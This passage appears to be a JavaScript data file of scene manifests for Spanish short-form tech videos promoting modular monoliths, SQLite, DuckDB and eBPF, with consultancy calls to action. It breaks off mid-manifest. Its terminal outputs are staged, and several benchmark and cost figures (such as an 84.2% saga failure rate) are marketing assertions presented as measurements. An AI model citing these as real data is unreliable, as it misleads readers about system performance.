window.__BIBLIOTECA_2026__ = [
  {
    "key": "demo_redis",
    "topicNum": "00",
    "group": "00. DEMO ORIGINAL",
    "label": "Por qué Redis procesa 100K peticiones por segundo",
    "variation": "Demo",
    "category": "SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "Por qué Redis procesa 100K peticiones por segundo",
      "fps": 30,
      "output": "C:\\Users\\Edixon\\Desktop\\VIDEO_REDIS_60S_FINAL.mp4",
      "scenes": [
        {
          "id": "scene_01_hook",
          "type": "kinetic_hook",
          "duration": 4,
          "voiceover": "¿Por qué Redis vuela mientras tu base de datos colapsa? Cien mil peticiones por segundo.",
          "visual_cue": "Entra texto cinético en muelle y rayo dorado",
          "props": {
            "badge": "ANÁLISIS DE SISTEMAS",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿POR QUÉ REDIS",
                "color": "#ffffff"
              },
              {
                "text": "VUELA?",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "100.000 PETICIONES POR SEGUNDO"
          }
        },
        {
          "id": "scene_02_bottleneck",
          "type": "metrics_comparison",
          "duration": 5,
          "voiceover": "El cuello de botella siempre es el disco. Una llamada al sistema NVMe tarda cincuenta mil nanosegundos.",
          "visual_cue": "Barra roja de disco se dispara hasta 50.000 ns",
          "props": {
            "badge": "EL PROBLEMA DE FONDO",
            "title": "EL CUELLO DE BOTELLA DEL DISCO",
            "itemA": {
              "name": "LATENCIA DISCO NVMe",
              "value": 50000,
              "max": 50000,
              "color": "#ef4444",
              "subtext": "50.000 ns POR LLAMADA AL SISTEMA"
            },
            "itemB": {
              "name": "LATENCIA OBJETIVO",
              "value": 1000,
              "max": 50000,
              "color": "#71717a",
              "subtext": "MÁXIMO TOLERADO EN ALTA CONCURRENCIA"
            },
            "speedup": "EL DISCO ES 50X DEMASIADO LENTO"
          }
        },
        {
          "id": "scene_03_ram_intro",
          "type": "kinetic_hook",
          "duration": 5.5,
          "voiceover": "El primer secreto: Redis elimina el disco por completo y opera cien por ciento en memoria RAM.",
          "visual_cue": "Aparece icono de memoria y texto verde 100% RAM",
          "props": {
            "badge": "SECRETO #1",
            "icon": "memory",
            "lines": [
              {
                "text": "CERO DISCO.",
                "color": "#ffffff"
              },
              {
                "text": "100% MEMORIA RAM.",
                "color": "#10b981"
              }
            ],
            "subtitle": "TIEMPO DE ACCESO: 80 NANOSEGUNDOS"
          }
        },
        {
          "id": "scene_04_memory_hex",
          "type": "memory_layout",
          "duration": 7,
          "voiceover": "Aquí lo ves en memoria real: punteros directos sin serializar y acceso físico en solo ochenta nanosegundos.",
          "visual_cue": "Tabla hexadecimal se ilumina mostrando punteros a RAM",
          "props": {
            "badge": "DEBUGGER DE MEMORIA",
            "title": "ACCESO DIRECTO A BYTES EN RAM",
            "rows": [
              {
                "addr": "0x7FFE0010",
                "hex": [
                  "72",
                  "65",
                  "64",
                  "69",
                  "73",
                  "5F",
                  "6B",
                  "76"
                ],
                "label": "KEY: \"redis_kv\""
              },
              {
                "addr": "0x7FFE0018",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "08",
                  "7F",
                  "FE",
                  "00",
                  "40"
                ],
                "label": "POINTER -> DICT"
              },
              {
                "addr": "0x7FFE0020",
                "hex": [
                  "FF",
                  "00",
                  "C0",
                  "A8",
                  "01",
                  "0A",
                  "1F",
                  "90"
                ],
                "label": "CLIENT TCP FD"
              },
              {
                "addr": "0x7FFE0028",
                "hex": [
                  "01",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "EXPIRE AT (TTL)"
              }
            ]
          }
        },
        {
          "id": "scene_05_myth_buster",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Multi-threading con hilos concurrentes? Falso. Redis corre en un solo hilo sin un solo lock.",
          "visual_cue": "Titular de mito se quiebra y entra 'ES UN SOLO HILO'",
          "props": {
            "badge": "EL GRAN MITO",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿MULTI-THREADING?",
                "color": "#ffffff"
              },
              {
                "text": "ES UN SOLO HILO.",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "CERO LOCKS. CERO CONCURRENCIA BLOQUEANTE."
          }
        },
        {
          "id": "scene_06_arch_flow",
          "type": "architecture_flow",
          "duration": 7.5,
          "voiceover": "Usa multiplexación con epoll: diez mil clientes envían datos y el event loop atiende los eventos listos sin frenar jamás.",
          "visual_cue": "Diagrama de flujo activo: paquetes viajan por carriles a la cola",
          "props": {
            "header": "MULTIPLEXACIÓN I/O CON EPOLL",
            "nodes": [
              {
                "id": "clients",
                "label": "CLIENT CONCURRENT CONNS",
                "sublabel": "10.000 CONEXIONES ABIERTAS",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "eventloop",
                "label": "SINGLE-THREADED EVENT LOOP",
                "sublabel": "I/O MULTIPLEXING (ae_epoll.c)",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "storage",
                "label": "IN-MEMORY HASH TABLE",
                "sublabel": "O(1) AVERAGE LOOKUP TIME",
                "color": "#10b981",
                "y": 880
              }
            ],
            "queueSlots": 6
          }
        },
        {
          "id": "scene_07_code_c",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "En su código en C, epoll_wait captura los eventos y processCommand ejecuta la consulta en memoria al instante.",
          "visual_cue": "Editor de código resalta la línea processCommand en amarillo",
          "props": {
            "badge": "CÓDIGO FUENTE DE REDIS",
            "filename": "ae_epoll.c",
            "lang": "C",
            "codeLines": [
              {
                "text": "int numevents = epoll_wait(state->epfd, state->events, ...);",
                "highlight": false
              },
              {
                "text": "for (int j = 0; j < numevents; j++) {",
                "highlight": false
              },
              {
                "text": "    // Procesa eventos de sockets sin locks ni threads",
                "highlight": false
              },
              {
                "text": "    processCommand(c); // Ejecución inmediata en memoria",
                "highlight": true
              },
              {
                "text": "}",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "gcc -O3 -c ae_epoll.c",
              "output": "ae_epoll.o generated (zero overhead kernel bindings)"
            }
          }
        },
        {
          "id": "scene_08_benchmark",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "El benchmark oficial lo demuestra: ciento dieciocho mil operaciones por segundo con latencia sub-milisegundo.",
          "visual_cue": "Terminal ejecuta redis-benchmark con salida de rendimiento en vivo",
          "props": {
            "badge": "BENCHMARK EN VIVO",
            "filename": "benchmark.sh",
            "lang": "BASH",
            "codeLines": [
              {
                "text": "redis-server --port 6379 --daemonize yes",
                "highlight": false
              },
              {
                "text": "redis-benchmark -q -n 100000 -c 50 -P 16",
                "highlight": true
              },
              {
                "text": "echo \"BENCHMARK DE ALTA CONCURRENCIA FINALIZADO\"",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "redis-benchmark -q -n 100000 -c 50 -P 16",
              "output": "SET: 118,483 req/sec (avg latency: 0.12ms)\nGET: 121,951 req/sec (avg latency: 0.09ms)\n100.00% <= 1 ms latency"
            }
          }
        },
        {
          "id": "scene_09_versus",
          "type": "metrics_comparison",
          "duration": 7.5,
          "voiceover": "Frente a los cuatro mil registros de una base SQL en disco, Redis rinde casi veinticinco veces más rápido.",
          "visual_cue": "Comparativa de barras en verde y bloque '24.6x MÁS RÁPIDO'",
          "props": {
            "badge": "COMPARATIVA FINAL",
            "title": "THROUGHPUT REAL MEDIDO",
            "itemA": {
              "name": "BASE DE DATOS SQL (DISCO)",
              "value": 4800,
              "max": 120000,
              "color": "#71717a",
              "subtext": "I/O SYSTEM CALL BOUND"
            },
            "itemB": {
              "name": "REDIS (RAM DIRECTA)",
              "value": 118500,
              "max": 120000,
              "color": "#10b981",
              "subtext": "IN-MEMORY ZERO-LOCK"
            },
            "speedup": "24.6x MÁS RÁPIDO"
          }
        },
        {
          "id": "scene_10_cierre",
          "type": "kinetic_hook",
          "duration": 5,
          "voiceover": "Lección de arquitectura: la RAM es el nuevo disco. Sígueme en SeDev para más ingeniería de sistemas.",
          "visual_cue": "Cierre con texto verde 'LA RAM ES EL NUEVO DISCO' y firma",
          "props": {
            "badge": "LECCIÓN DE INGENIERÍA",
            "icon": "speed",
            "lines": [
              {
                "text": "LA RAM ES",
                "color": "#ffffff"
              },
              {
                "text": "EL NUEVO DISCO.",
                "color": "#10b981"
              }
            ],
            "subtitle": "SEDEV: ARQUITECTURA DE SOFTWARE"
          }
        }
      ]
    }
  },
  {
    "key": "01_A",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var A (Técnico): Cómo estructurar un Monolito Modular sin código espagueti",
    "variation": "A (Técnico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Cómo estructurar un Monolito Modular sin código espagueti (Var A)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook",
          "type": "architecture_flow",
          "duration": 6,
          "voiceover": "¿Tu monolito se volvió un monstruo inmanejable? El error no fue el monolito: fue no definir límites de dominio.",
          "visual_cue": "Diagrama de arquitectura con límites estrictos de dominio y módulos aislados",
          "props": {
            "header": "ARQUITECTURA MODERNA",
            "title": "LÍMITES DE DOMINIO EN UN SOLO BINARIO",
            "nodes": [
              {
                "id": "api",
                "label": "API ROUTER UNIFICADO",
                "sublabel": "Fastify / Axum Gateway",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "modules",
                "label": "MÓDULOS DE DOMINIO (DDD)",
                "sublabel": "Auth · Orders · Billing (Aislamiento en RAM)",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "storage",
                "label": "POSTGRES TRANSACCIONAL",
                "sublabel": "Esquemas lógicos separados con ACID nativo",
                "color": "#fbbf24",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "problem",
          "type": "tradeoff_matrix",
          "duration": 5.5,
          "voiceover": "Partir tu app en veinte microservicios solo multiplicó la latencia de red y los fallos distribuidos.",
          "visual_cue": "Tabla comparativa mostrando la sobrecarga de microservicios vs monolito modular",
          "props": {
            "header": "DIAGNÓSTICO ARQUITECTÓNICO",
            "title": "EL COSTE OCULTO DE DISTRIBUIR",
            "subtitle": "LATENCIA DE RED VS LLAMADAS EN RAM",
            "colA": "MONOLITO MODULAR",
            "colB": "MICROSERVICIOS",
            "rows": [
              {
                "dim": "Llamadas internas",
                "a": "< 0.01ms (RAM)",
                "b": "15-40ms (HTTP)",
                "aGood": true
              },
              {
                "dim": "Transacciones",
                "a": "ACID Nativas",
                "b": "Saga Pattern (Frágil)",
                "aGood": true
              },
              {
                "dim": "Despliegues",
                "a": "1 Pipeline simple",
                "b": "15 Pipelines K8s",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "code_boundary",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "En código, prohibimos las importaciones directas entre módulos. Cada dominio expone una interfaz pública estricta.",
          "visual_cue": "Terminal mostrando TypeScript haciendo cumplir límites de módulos con ESLint",
          "props": {
            "header": "REGLAS EN CI/CD",
            "title": "ENFORCEMENT DE IMPORTACIONES",
            "filename": "packages/orders/domain.ts",
            "codeLines": [
              "# Importación profunda bloqueada por el linter:",
              "import { PaymentModel } from \"@app/billing/internal\"; // ERROR",
              "",
              "# Comunicación correcta por contrato público:",
              "import { BillingFacade } from \"@app/billing\";",
              "const invoice = await BillingFacade.charge(order.id);"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "acid_power",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Lo mejor: conservas transacciones ACID completas. Si el pago falla, la orden se cancela sin dramas distribuidos.",
          "visual_cue": "Métricas de fiabilidad de transacciones: 100% consistencia vs eventual consistency",
          "props": {
            "header": "INTEGRIDAD DE DATOS",
            "metricA": {
              "label": "MICROSERVICIOS (SAGA)",
              "value": "84.2%",
              "sub": "Fallos de consistencia eventual",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOLITO MODULAR",
              "value": "100%",
              "sub": "Garantía ACID en una sola base",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta",
          "type": "terminal_split",
          "duration": 5,
          "voiceover": "Si tu equipo está atrapado en un laberinto de microservicios y quieres migrar a un monolito modular limpio, link en mi bio para auditar tu arquitectura.",
          "visual_cue": "Terminal de auditoría con verificación de arquitectura y llamada a la acción",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
            "title": "SIMPLIFICA TU CODEBASE",
            "leftTitle": "ANÁLISIS DE MIGRACIÓN",
            "rightTitle": "BENEFICIOS CLAVE",
            "leftText": "$ npx audit-architecture --inspect\n✔ Dependencias cíclicas: 0 detectadas\n✔ Aislamiento de módulos: 100% verificado\n✔ Latencia interna: 0.01ms (In-Memory)",
            "rightText": "• Despliegue en 1 comando\n• Cero sobrecarga de Kubernetes\n• Ahorro del 60% en costos de nube\n• Agenda tu sesión: enlace en el perfil"
          }
        }
      ]
    }
  },
  {
    "key": "01_B",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var B (Polémico): Por qué tu startup NO necesita microservicios",
    "variation": "B (Polémico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Por qué tu startup NO necesita microservicios (Var B)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "shock_hook",
          "type": "architecture_flow",
          "duration": 5.5,
          "voiceover": "Netflix usa microservicios porque tiene dos mil ingenieros. Tú tienes cuatro personas y estás quemando quince mil dólares al mes.",
          "visual_cue": "Diagrama mostrando la telaraña de microservicios vs la simplicidad de 1 binario",
          "props": {
            "header": "REALIDAD DE STARTUP",
            "title": "SOBREINGENIERÍA VS RENTABILIDAD",
            "nodes": [
              {
                "id": "clients",
                "label": "TRÁFICO REAL DE STARTUP",
                "sublabel": "100-500 peticiones por minuto",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "monolith",
                "label": "1 BINARIO COMPILADO EN HETZNER",
                "sublabel": "Postgres embebido o local · 0ms red",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "k8s_hell",
                "label": "KUBERNETES DISTRIBUIDO (EVITAR)",
                "sublabel": "15 pods · Sidecars · AWS NAT Gateway carísimo",
                "color": "#ef4444",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "metrics_cost",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "La factura de AWS: tres mil dólares en NAT Gateways y bases de datos distribuidas que solo mueven cien peticiones por minuto.",
          "visual_cue": "Métricas de coste mensual: 15.000 dólares en microservicios vs 120 dólares en servidor bare metal",
          "props": {
            "header": "GASTO MENSUAL EN INFRAESTRUCTURA",
            "metricA": {
              "label": "MICROSERVICIOS K8S",
              "value": "$14.800",
              "sub": "NAT Gateways · Control Plane · Logs",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOLITO MODULAR",
              "value": "$140",
              "sub": "Servidor Bare Metal en Hetzner",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_solucion",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Vuelve a lo simple: un solo repositorio, un solo pipeline, despliegue en diez segundos. Link en mi perfil si necesitas auditar tu infraestructura.",
          "visual_cue": "Terminal con despliegue instantáneo en 10 segundos y enlace en bio",
          "props": {
            "header": "CONSULTORÍA TÉCNICA (Link en bio)",
            "title": "DESPLIEGUE EN 10 SEGUNDOS",
            "leftTitle": "PIPELINE SIMPLIFICADO",
            "rightTitle": "BENEFICIOS DE NEGOCIO",
            "leftText": "$ git push production main\n✔ Compilando binario único...\n✔ Tests de módulos aprobados (3.2s)\n✔ Despliegue Zero-Downtime completado",
            "rightText": "• Reduce el gasto de AWS en 90%\n• Despliega features 5x más rápido\n• Cero llamadas rotas entre microservicios\n• ¿Evaluamos tu stack? Link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "02_A",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var A (Técnico): 0ms de latencia: Arquitectura de SQLite embebido con Litestream",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS",
    "manifest": {
      "title": "[02] 0ms de latencia: Arquitectura de SQLite embebido con Litestream (Var A)",
      "category": "BASES DE DATOS",
      "slug": "02_sqlite_produccion",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "latency_lead",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "¿Cuánto tiempo pasa tu backend esperando que PostgreSQL responda por la red? Entre cinco y cuarenta milisegundos.",
          "visual_cue": "Gráfica de escala de latencia: red vs bus NVMe local",
          "props": {
            "header": "MÉTRICA DE HARDWARE",
            "title": "EL COSTE DEL SALTO DE RED",
            "subtitle": "RED LOCAL VS LECTURA DIRECTA EN DISCO NVMe"
          }
        },
        {
          "id": "storage_engine",
          "type": "storage_engine_viz",
          "duration": 6.5,
          "voiceover": "Con SQLite embebido, la base de datos corre en el mismo proceso. No hay TCP, no hay serialización: son lecturas en memoria a cero milisegundos.",
          "visual_cue": "Visualizador del motor de almacenamiento B-Tree de SQLite y Write-Ahead Log (WAL)",
          "props": {
            "mode": "btree",
            "badge": "MOTOR EMBEBIDO",
            "title": "ACCESO DIRECTO A PÁGINAS DE DISCO",
            "subtitle": "B-TREE DE 4 KB EN MEMORIA SIN SOCKETS TCP"
          }
        },
        {
          "id": "concurrency_terminal",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "¿Y la replicación? Litestream replica cada transacción a S3 en segundo plano. Cero pérdida de datos y cero mantenimiento de clústeres.",
          "visual_cue": "Terminal mostrando benchmark de concurrencia y replicación streaming a S3",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
            "title": "REPLICACIÓN EN TIEMPO REAL",
            "leftTitle": "LITESTREAM STREAMING",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "$ litestream replicate app.db s3://backups\n✔ WAL stream sincronizado\n✔ Latencia de replicación: 85ms\n✔ Recovery Point Objective (RPO): < 1s",
            "rightText": "• 50.000 peticiones/seg en 1 CPU\n• Cero costos de RDS en Amazon\n• Backup continuo en streaming\n• Optimiza tu base: enlace en el perfil"
          }
        }
      ]
    }
  },
  {
    "key": "02_B",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var B (Polémico): ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS",
    "manifest": {
      "title": "[02] ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia (Var B)",
      "category": "BASES DE DATOS",
      "slug": "02_sqlite_produccion",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "bench_shock",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Existe el mito de que SQLite no aguanta concurrencia. Aquí estamos corriendo cincuenta mil peticiones por segundo en un solo servidor de cincuenta dólares.",
          "visual_cue": "Terminal ejecutando bombardier sobre SQLite en modo WAL",
          "props": {
            "header": "BENCHMARK DE CONCURRENCIA",
            "title": "50.000 PETICIONES POR SEGUNDO",
            "leftTitle": "EJECUCIÓN DE PRUEBA",
            "rightTitle": "RESULTADO DE ESTRÉS",
            "leftText": "$ k6 run --vus 500 --duration 10s stress.js\n✔ 500 conexiones simultáneas activas\n✔ WAL mode: enabled (Multi-reader/1-writer)\n✔ Errores 5xx: 0% (0 fallos de bloqueo)",
            "rightText": "• Throughput: 51.420 req/sec\n• P99 Latency: 0.18 ms\n• Uso de CPU: 42% en 4 núcleos\n• SQLite en NVMe destruye mitos"
          }
        },
        {
          "id": "storage_tree",
          "type": "storage_engine_viz",
          "duration": 6,
          "voiceover": "El secreto es el modo WAL: los lectores nunca bloquean a los escritores y las lecturas van directo a la memoria caché del kernel.",
          "visual_cue": "Visualizador del motor B-Tree con el WAL recibiendo escrituras secuenciales",
          "props": {
            "mode": "btree",
            "badge": "CONCURRENCIA WAL",
            "title": "READERS NO BLOQUEAN A WRITERS",
            "subtitle": "ESCRITURAS APPEND-ONLY EN EL WAL LOG"
          }
        },
        {
          "id": "metrics_compare",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Si tu app no mueve más de mil escrituras por segundo, pagar por RDS en AWS es botar el dinero. Link en mi bio si quieres auditar tu arquitectura de datos.",
          "visual_cue": "Comparativa de costos y latencia: RDS Postgres vs SQLite Litestream",
          "props": {
            "header": "CONSULTORÍA DE DATOS (Link en bio)",
            "metricA": {
              "label": "AWS RDS POSTGRES",
              "value": "$850 / mes",
              "sub": "Latencia de red: 15ms · Complejidad",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "SQLITE + LITESTREAM",
              "value": "$45 / mes",
              "sub": "Latencia local: 0.05ms · Cero Ops",
              "color": "#10b981"
            }
          }
        }
      ]
    }
  },
  {
    "key": "03_A",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var A (Técnico): Procesamiento Columnar Vectorizado: 10M filas en milisegundos",
    "variation": "A (Técnico)",
    "category": "DATA ENGINEERING",
    "manifest": {
      "title": "[03] Procesamiento Columnar Vectorizado: 10M filas en milisegundos (Var A)",
      "category": "DATA ENGINEERING",
      "slug": "03_duckdb_analytics",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "columnar_viz",
          "type": "storage_engine_viz",
          "duration": 6.5,
          "voiceover": "¿Por qué DuckDB analiza diez millones de filas en milisegundos mientras Postgres colapsa? Todo está en el formato columnar y las instrucciones SIMD.",
          "visual_cue": "Visualizador del motor columnar vectorizado procesando bloques contiguos de memoria con SIMD",
          "props": {
            "mode": "columnar",
            "badge": "MOTOR VECTORIZADO",
            "title": "FILAS TRADICIONALES VS COLUMNAS SIMD",
            "subtitle": "DUCKDB: PROCESAMIENTO POR LOTES DE VECTORES"
          }
        },
        {
          "id": "code_parquet",
          "type": "code_terminal",
          "duration": 5,
          "voiceover": "DuckDB lee archivos Parquet directamente desde S3 o tu disco local sin levantar servidores pesados ni pipelines de Kafka.",
          "visual_cue": "Terminal mostrando consulta SQL directa sobre Parquet sin ingesta previa",
          "props": {
            "header": "QUERY IN-PROCESS",
            "title": "CONSULTA DIRECTA SOBRE PARQUET",
            "filename": "analytics.sql",
            "codeLines": [
              "# Consulta in-process sin servidor intermedio:",
              "SELECT country, SUM(total_amount)",
              "FROM \"s3://warehouse/sales_2026/*.parquet\"",
              "WHERE created_at >= \"2026-01-01\"",
              "GROUP BY country ORDER BY 2 DESC;"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "metrics_speed",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "El resultado: consultas analíticas hasta ochenta veces más rápidas usando una fracción de la memoria.",
          "visual_cue": "Comparativa de velocidad analítica: Postgres vs DuckDB",
          "props": {
            "header": "AGREGACIÓN SOBRE 10M FILAS",
            "metricA": {
              "label": "POSTGRESQL (ROW)",
              "value": "18.4 seg",
              "sub": "Escaneo completo de filas en disco",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "DUCKDB (COLUMNAR)",
              "value": "0.24 seg",
              "sub": "SIMD AVX-512 sobre vectores en RAM",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_data",
          "type": "terminal_split",
          "duration": 4.5,
          "voiceover": "Si tu equipo gasta fortunas en Snowflake o Databricks para analítica básica, link en bio para modernizar tu pipeline de datos.",
          "visual_cue": "Terminal de auditoría con optimización de analítica in-process",
          "props": {
            "header": "CONSULTORÍA DE DATOS (Link en bio)",
            "title": "ANALÍTICA SIN SERVIDORES",
            "leftTitle": "INSPECCIÓN DE DATA PIPELINES",
            "rightTitle": "AHORRO INMEDIATO",
            "leftText": "$ npx audit-data-stack\n✔ Warehouse actual: Snowflake ($14K/mes)\n✔ Cargas de trabajo: 92% agregaciones simples\n✔ Migración recomendada: DuckDB + Parquet",
            "rightText": "• Elimina el 85% de tu factura analítica\n• Respuestas en milisegundos en vez de minutos\n• Cero mantenimiento de infraestructura\n• ¿Agendamos revisión? Enlace en perfil"
          }
        }
      ]
    }
  },
  {
    "key": "03_B",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var B (Polémico): Snowflake es un desperdicio: Analítica in-process con Parquet",
    "variation": "B (Polémico)",
    "category": "DATA ENGINEERING",
    "manifest": {
      "title": "[03] Snowflake es un desperdicio: Analítica in-process con Parquet (Var B)",
      "category": "DATA ENGINEERING",
      "slug": "03_duckdb_analytics",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "bill_shock",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Tu startup paga catorce mil dólares mensuales en Snowflake para hacer queries que caben perfectamente en la memoria de una laptop.",
          "visual_cue": "Métricas de coste comparando Snowflake vs DuckDB",
          "props": {
            "header": "DESPERDICIO DE NUBE EN ANALÍTICA",
            "metricA": {
              "label": "SNOWFLAKE WAREHOUSE",
              "value": "$14.200",
              "sub": "Factura mensual recurrente en la nube",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "DUCKDB + S3 PARQUET",
              "value": "$85",
              "sub": "Almacenamiento S3 + CPU del servidor",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "columnar_diagram",
          "type": "storage_engine_viz",
          "duration": 6,
          "voiceover": "DuckDB corre embebido en tu API de Node o Python. Lee Parquet comprimido con Dictionary Encoding y procesa cien mil registros en milisegundos.",
          "visual_cue": "Visualizador del almacenamiento columnar demostrando el 94% menos de I/O en lecturas",
          "props": {
            "mode": "columnar",
            "badge": "ZERO SERVIDORES",
            "title": "ANALÍTICA IN-PROCESS",
            "subtitle": "PARQUET + DUCKDB CORRIENDO EN TU PROPIA APP"
          }
        }
      ]
    }
  },
  {
    "key": "04_A",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var A (Técnico): eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware",
    "variation": "A (Técnico)",
    "category": "SISTEMAS Y REDES",
    "manifest": {
      "title": "[04] eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware (Var A)",
      "category": "SISTEMAS Y REDES",
      "slug": "04_ebpf_linux_kernel",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "kernel_lead",
          "type": "kernel_sandbox_viz",
          "duration": 6,
          "voiceover": "Cada vez que un paquete viaja de la tarjeta de red a tu aplicación en Node o Go, el kernel gasta miles de nanosegundos en context switches.",
          "visual_cue": "Visualizador de privilegios Ring 3 (Userspace) vs Ring 0 (Kernel) y penalización de Syscalls",
          "props": {
            "badge": "NIVEL DE PRIVILEGIO OS",
            "title": "FRONTERA DE SYSCALLS",
            "subtitle": "USERSPACE VS KERNEL SPACE EN LINUX"
          }
        },
        {
          "id": "packet_pipeline",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "Con eBPF inyectas programas verificados directo en el kernel. Los paquetes se filtran y enrutan en el driver de la tarjeta antes de tocar la pila de red.",
          "visual_cue": "Tubería de red con hooks XDP procesando paquetes a velocidad de cable",
          "props": {
            "header": "ARQUITECTURA eBPF",
            "title": "HOOKS DIRECTOS EN XDP / DRIVER",
            "latency": "12 ns",
            "stages": [
              {
                "name": "NIC Driver (XDP)",
                "tag": "Hardware hook"
              },
              {
                "name": "eBPF JIT Verifier",
                "tag": "Ring 0 execution"
              },
              {
                "name": "Direct Packet Return",
                "tag": "Bypass Userspace"
              }
            ]
          }
        },
        {
          "id": "trace_terminal",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Telemetría, seguridad Zero-Trust y balanceo de carga sin modificar una sola línea de tu código. Link en bio si quieres optimizar tu infraestructura Linux.",
          "visual_cue": "Terminal mostrando bpftrace interceptando conexiones en tiempo real",
          "props": {
            "header": "CONSULTORÍA DE INFRAESTRUCTURA (Link en bio)",
            "title": "OBSERVABILIDAD EN KERNEL",
            "leftTitle": "BPFTRACE TELEMETRÍA",
            "rightTitle": "BENEFICIOS DE RENDIMIENTO",
            "leftText": "$ bpftrace -e \"kprobe:tcp_connect { printf(\"%s -> %d\\n\", comm, pid); }\"\nAttaching 1 probe...\nnode -> 4819 (10.0.1.4:443)\ncurl -> 4822 (10.0.1.8:80)",
            "rightText": "• Cero sobrecarga de proxies sidecar\n• Latencia reducida en un 80%\n• Seguridad verificada a nivel de socket\n• Audita tus servidores: enlace en bio"
          }
        }
      ]
    }
  },
  {
    "key": "04_B",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var B (Polémico): Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo",
    "variation": "B (Polémico)",
    "category": "SISTEMAS Y REDES",
    "manifest": {
      "title": "[04] Muerte a los Sidecars de Kubernetes: Por qué eBPF lo cambia todo (Var B)",
      "category": "SISTEMAS Y REDES",
      "slug": "04_ebpf_linux_kernel",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "sidecar_death",
          "type": "kernel_sandbox_viz",
          "duration": 6,
          "voiceover": "Los sidecars de Envoy en Kubernetes consumen hasta el veinticinco por ciento de tu CPU solo copiando paquetes entre userspace y kernel. eBPF los hace obsoletos.",
          "visual_cue": "Visualizador del kernel mostrando el bypass de sidecars mediante eBPF",
          "props": {
            "badge": "ELIMINACIÓN DE SIDECARS",
            "title": "BYPASS TOTAL DEL USERSPACE",
            "subtitle": "CILIUM eBPF REEMPLAZANDO PROXIES PESADOS"
          }
        },
        {
          "id": "terminal_compare",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Cilium reemplaza toda esa basura enrutando el tráfico directamente en el socket del kernel. Link en bio si quieres reducir costes de Kubernetes.",
          "visual_cue": "Terminal comparando latencia y consumo de CPU: Istio vs Cilium eBPF",
          "props": {
            "header": "AUDITORÍA DE KUBERNETES (Link en bio)",
